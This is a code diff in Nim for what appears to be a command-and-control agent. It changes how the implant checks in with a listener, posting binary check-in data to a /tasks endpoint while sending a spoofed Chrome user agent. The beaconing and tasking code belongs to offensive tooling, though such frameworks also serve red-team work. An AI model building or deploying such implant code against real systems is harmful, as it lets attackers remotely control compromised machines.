@@ -1,7 +1,6 @@
 import httpclient, json, strformat, asyncdispatch
 
 import ./metadata
-import ../agentTypes
 import ../../../common/[types, utils]
 
 const USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
@@ -31,14 +30,22 @@ proc register*(config: AgentConfig, registrationData: seq[byte]): bool {.discard
 
     return true
 
-proc getTasks*(config: AgentConfig): string = 
+proc getTasks*(config: AgentConfig, checkinData: seq[byte]): string = 
 
     let client = newAsyncHttpClient(userAgent = USER_AGENT)
     var responseBody = ""
 
+    # Define HTTP headers
+    client.headers = newHttpHeaders({ 
+        "Content-Type": "application/octet-stream",
+        "Content-Length": $checkinData.len
+    })
+
+    let body = checkinData.toString()
+
     try:
         # Retrieve binary task data from listener and convert it to seq[bytes] for deserialization 
-        responseBody = waitFor client.getContent(fmt"http://{config.ip}:{$config.port}/{config.listenerId}/{config.agentId}/tasks")
+        responseBody = waitFor client.postContent(fmt"http://{config.ip}:{$config.port}/tasks", body)
         return responseBody
     
     except CatchableError as err:
